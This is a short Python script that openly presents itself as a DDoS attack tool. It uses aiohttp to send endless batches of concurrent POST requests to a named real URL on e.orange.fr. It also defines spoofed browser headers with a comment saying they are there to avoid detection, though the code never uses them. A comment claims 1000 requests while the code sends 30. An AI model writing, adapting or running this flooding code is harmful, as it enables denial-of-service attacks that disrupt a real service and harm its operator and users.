import aiohttp
import asyncio
import time

async def send_request(session):
    try:
        async with session.post('http://e.orange.fr/error500.html?who=ozeliurs') as response:
            await response.text()
    except:
        pass

async def launch_attack():
    async with aiohttp.ClientSession() as session:
        tasks = []
        # Create 1000 concurrent requests
        for _ in range(30):
            task = asyncio.create_task(send_request(session))
            tasks.append(task)
        await asyncio.gather(*tasks)

def main():
    print("Starting DDoS attack...")
    while True:
        asyncio.run(launch_attack())
        print(f"Sent 30 requests at {time.strftime('%H:%M:%S')}")

if __name__ == "__main__":
    # Add randomized User-Agent and other headers to avoid detection
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
    }

    try:
        main()
    except KeyboardInterrupt:
        print("\nAttack stopped by user")
